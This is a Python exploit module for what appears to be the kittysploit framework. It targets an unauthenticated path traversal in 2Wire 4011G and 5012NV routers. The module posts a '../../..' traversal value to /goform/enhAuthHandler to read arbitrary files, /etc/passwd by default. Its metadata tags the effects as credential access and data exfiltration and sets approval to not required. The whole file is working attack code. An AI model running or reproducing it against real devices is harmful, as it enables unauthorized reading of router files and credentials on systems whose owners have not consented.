#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""2Wire 4011G & 5012NV Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '2Wire 4011G & 5012NV Path Traversal',
        'description': 'Module exploits path traversal vulnerability in 2Wire 4011G and 5012NV devices. If the target is vulnerable it is possible to read file from the filesystem.',
        'author': ['adiaz', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.underground.org.mx/index.php?topic=28616.0'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address: 192.168.1.1")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/passwd", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            print_status("Sending read {} file request".format(self.filename))

            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {
                "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../..{}".format(self.filename),
                "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
                "__ENH_ERROR_REDIRECT_PATH__": "",
                "username": "tech"
            }

            response = self.http_request(
                method="POST",
                path="/goform/enhAuthHandler",
                headers=headers,
                data=data,
            )

            if response is None:
                return

            print_status("Reading file {}".format(self.filename))
            print_info(response.text)
        else:
            print_error("Target seems to be not vulnerable")
    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {
            "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../../etc/passwd",
            "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
            "__ENH_ERROR_REDIRECT_PATH__": "",
            "username": "tech"
        }
        response = self.http_request(
            method="POST",
            path="/goform/enhAuthHandler",
            headers=headers,
            data=data,
        )

        if response and ("/etc/passwd" in (response.text or '')):
            return True  # target is vulnerable

        return False  # target is not vulnerable
